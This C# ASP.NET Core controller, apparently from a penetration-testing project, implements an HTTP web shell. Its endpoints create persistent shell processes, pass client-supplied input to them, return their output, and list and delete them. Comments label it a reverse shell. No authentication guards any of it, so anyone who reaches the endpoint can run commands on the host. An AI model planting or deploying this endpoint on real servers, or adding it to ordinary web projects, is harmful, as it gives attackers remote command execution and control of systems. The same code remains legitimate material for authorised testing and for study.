using Microsoft.AspNetCore.Mvc;
using PentestingCommon;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

// For more information on enabling Web API for empty projects, visit https://go.microsoft.com/fwlink/?LinkID=397860

namespace PentestingAPI.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class HttpShell : ControllerBase
    {
        public static SortedDictionary<int, PersistentShell> Shells { get; set; }

        public HttpShell()
        {
            // create shells dictionary if it doesn't exist
            if (Shells == null)
            {
                Shells = new SortedDictionary<int, PersistentShell>();
            }
        }

        // GET: api/<ReverseShell>
        [HttpGet]
        public IActionResult Get()
        {
            // get shell descriptions
            var shellDescriptions = from shell in Shells
                                    select new
                                    {
                                        shell.Key,
                                        Pid = shell.Value.Process.Id,
                                        CurrentInput = shell.Value.CurrentInput.ToString()
                                    };
            // return shell descriptions
            return Ok(shellDescriptions);
        }

        // GET api/<ReverseShell>/5
        [HttpGet("{id}")]
        public IActionResult Get(int id)
        {
            // return no content status if shell doesn't exist
            if (!Shells.ContainsKey(id))
            {
                return NoContent();
            }

            // get shell descriptions
            var shellDescriptions = from shell in Shells
                                    where shell.Key == id
                                    select new
                                    {
                                        shell.Key,
                                        Pid = shell.Value.Process.Id,
                                        CurrentInput = shell.Value.CurrentInput.ToString()
                                    };
            // return shell descriptions
            return Ok(shellDescriptions);
        }

        // POST api/<ReverseShell>
        [HttpPost]
        public async Task<IActionResult> Post([FromBody] StandardInputObject stdInput)
        {
            // return no content status if shell doesn't exist
            if (!Shells.ContainsKey(stdInput.Id))
            {
                return NoContent();
            }

            // write content to shell
            Shells[stdInput.Id].Write(stdInput);
            // return shell's output
            return Ok(await Shells[stdInput.Id].WaitForShellOutput());
        }

        // PUT api/<ReverseShell>/5
        [HttpPut("{id}")]
        public async Task<string> Put(int id, [FromBody] StandardInputObject stdInput)
        {
            // if shell doesn't exist create otherwise update it
            if (!Shells.ContainsKey(id))
            {
                Shells.Add(id, new PersistentShell()); 
            }
            else
            {
                Shells[id] = new PersistentShell();
            }

            // write content to shell
            Shells[stdInput.Id].Write(stdInput);
            // return shell's output
            return await Shells[stdInput.Id].WaitForShellOutput();
        }

        // DELETE api/<ReverseShell>/5
        [HttpDelete("{id}")]
        public IActionResult Delete(int id)
        {
            // return no content status fif shell doesn't exist
            if (!Shells.ContainsKey(id))
            {
                return NoContent();
            }

            // remove shell
            Shells.Remove(id);
            // return shell id that was removed
            return Ok(id);
        }
    }
}
